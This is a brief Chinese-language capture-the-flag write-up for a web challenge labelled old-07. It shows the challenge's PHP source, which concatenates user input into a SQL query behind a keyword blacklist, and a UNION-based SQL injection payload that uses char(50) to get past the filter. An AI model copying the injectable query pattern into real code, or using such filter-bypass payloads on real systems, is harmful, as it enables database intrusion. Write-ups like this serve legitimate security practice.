# old-07_300

* 一進到這個網站直接點進去 source code 
    ```php=
    <?php
    $go=$_GET['val'];
    if(!$go) { echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }
    echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");
    if(preg_match("/2|-|\+|from|_|=|\\s|\*|\//i",$go)) exit("Access Denied!");
    $db = dbconnect();
    $rand=rand(1,5);
    if($rand==1){
      $result=mysqli_query($db,"select lv from chall7 where lv=($go)") or die("nice try!");
    }
    if($rand==2){
      $result=mysqli_query($db,"select lv from chall7 where lv=(($go))") or die("nice try!");
    }
    if($rand==3){
      $result=mysqli_query($db,"select lv from chall7 where lv=((($go)))") or die("nice try!");
    }
    if($rand==4){
      $result=mysqli_query($db,"select lv from chall7 where lv=(((($go))))") or die("nice try!");
    }
    if($rand==5){
      $result=mysqli_query($db,"select lv from chall7 where lv=((((($go)))))") or die("nice try!");
    }
    $data=mysqli_fetch_array($result);
    if(!$data[0]) { echo("query error"); exit(); }
    if($data[0]==1){
      echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Access_Denied!')\"><p>");
    }
    elseif($data[0]==2){
      echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=\"alert('Hello admin')\"><p>");
      solve(7);
    }
    ?>
    ```
    該程式碼的大意就是如果 data[0] = 2 的話可以過這一題，傳輸的值當中會過濾掉 2, -, from 等等，之後會 rand 1 到 5，之後就是要思考 sql injection 的 payload 拉
* 我選擇的是 `select lv from chall7 where lv=($go)` 
* 如果 payload 是 `0)union(select(char(50))` 把它填到 \$go 裡面
    `select lv from chall7 where lv=(0)union(select(char(50)))` 完美
* 接下來就是一直刷 F5 直到過摟
